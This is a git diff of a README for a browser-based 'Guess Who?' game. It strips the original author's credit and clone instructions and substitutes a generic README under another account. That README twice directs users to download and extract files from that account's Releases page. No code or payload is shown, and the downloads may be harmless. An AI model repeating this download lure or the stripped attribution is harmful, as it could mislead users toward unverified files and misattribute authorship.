@@ -1,78 +1,79 @@
-# Guess WHO ? - Web Game
-#### Author: Bocaletto Luca
+# 🎉 Guess Who? Web Game 🎉
 
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat-square&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat-square&logo=css3)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![Bootstrap 5](https://img.shields.io/badge/Bootstrap-7952B3?style=flat-square&logo=bootstrap&logoColor=white)](https://getbootstrap.com)
-[![Anime.js](https://img.shields.io/badge/Anime.js-FF2D20?style=flat-square)](https://animejs.com)
+![Guess Who? Banner](https://img.shields.io/badge/Guess_Who-Play_Now-blue?style=for-the-badge&logo=gamepad)
 
----
+Welcome to the **Guess Who?** web game! This project brings the classic board game "Indovina Chi?" to your browser. In this game, you will select a secret character and use your deduction skills to figure out who it is by asking questions or making direct guesses. 
 
-## Description
+## Table of Contents
 
-**Guess WHO ? Web Game** is a web implementation of the classic "Indovina Chi?" board game.  
-In this game, a secret character is chosen at random and the player must figure out which one it is by asking questions or directly selecting a character. The project is built using HTML5, CSS3, and JavaScript. It uses the Canvas API to render a dynamic 2D board that displays a grid of character cards (complete with emoticons and names), and it leverages open source libraries such as Bootstrap for responsive layout and Anime.js for smooth animations.
-
----
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Gameplay Instructions](#gameplay-instructions)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
 ## Features
 
-- **Responsive and Modern UI:**  
-  The game is rendered in a single HTML page with a clean, modern interface. The layout adjusts thanks to Bootstrap’s grid system.
-
-- **Canvas-Based Animation:**  
-  Uses the HTML5 Canvas API to render the animated board, character cards, and interactive elements with fluid transitions.
-
-- **Dynamic Character Board:**  
-  The game randomly selects a secret character. All characters (represented with emoticons and names) are displayed in a grid, and clicking on a character verifies whether it matches the secret one.
-
-- **Extensible Gameplay:**  
-  The code is structured to be easily extended—adding new characters, attributes or questions between characters is straightforward.
-
-- **Interactive Feedback:**  
-  Animations (using Anime.js) and visual cues (hover effects and scaling) provide feedback when characters are selected, and results (correct/incorrect) are shown immediately.
-
----
-
-## How to Play
-
-1. **Starting the Game:**  
-   Open the `index.html` file in any modern web browser.
-
-2. **Gameplay:**  
-   - The game randomly selects a secret character that is *not* shown to the player.
-   - The board displays a grid of character cards using emoticons and character names.
-   - Click on the character card you believe matches the secret character.
-   - If you choose the correct character, the game will show a celebratory message with animations; otherwise, the card will be dimmed to indicate that option is excluded.
-   
-3. **Extending the Game:**  
-   You can add more characters, sophisticated filtering questions, or even new game modes by modifying the code.
-
----
+- 🎮 Classic gameplay with a modern twist.
+- 🌐 Responsive design for all devices.
+- 🎨 Engaging graphics using the Canvas API.
+- ❓ Dynamic question and answer format.
+- 🕹️ Easy to use interface.
 
 ## Technologies Used
 
-- **HTML5, CSS3 & JavaScript:**  
-  Core technologies for building the web application.
+This project is built with the following technologies:
 
-- **Canvas API:**  
-  For rendering the character grid and dynamic animations.
+- **HTML5**: For structuring the game.
+- **CSS3**: For styling the game interface.
+- **JavaScript**: For game logic and interactivity.
+- **Canvas API**: For rendering graphics dynamically.
 
-- **Bootstrap 5:**  
-  For a responsive and consistent UI layout.
+## Installation
 
-- **Anime.js:**  
-  For smooth animations and interactive effects.
+To play the game, you can download the latest release from our [Releases](https://github.com/DanPgms829/Guess-Who/releases) section. Follow these steps:
+
+1. Click on the link to visit the Releases page.
+2. Download the latest version.
+3. Extract the files.
+4. Open `index.html` in your web browser.
+
+## Gameplay Instructions
+
+1. **Start the Game**: Open the game in your browser. You will see a grid of characters.
+2. **Choose a Secret Character**: A character will be chosen randomly as your secret character.
+3. **Ask Questions**: Use the question format to narrow down your options. For example, you can ask, "Does my character have glasses?"
+4. **Make a Guess**: If you think you know the secret character, make your guess by clicking on the character.
+5. **Win or Lose**: If you guess correctly, you win! If not, keep asking questions until you figure it out.
+
+## Contributing
+
+We welcome contributions! If you would like to help improve the game, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. Feel free to use it for personal or educational purposes.
+
+## Contact
+
+For any questions or suggestions, feel free to reach out:
+
+- **Email**: dan@example.com
+- **GitHub**: [DanPgms829](https://github.com/DanPgms829)
+
+## Releases
+
+To get the latest version of the game, please visit our [Releases](https://github.com/DanPgms829/Guess-Who/releases) section. Download the necessary files and enjoy the game!
 
 ---
 
-## Installation and Usage
-
-1. **Clone the Repository:**
-
-   ```bash
-   git clone https://github.com/bocaletto-luca/Guess-Who.git
-2. Start Webserver Example Apache2 and open in web browser index.html
-
-#### Enjoy Game - By Bocaletto Luca
+Thank you for checking out **Guess Who?** We hope you enjoy playing it as much as we enjoyed creating it!
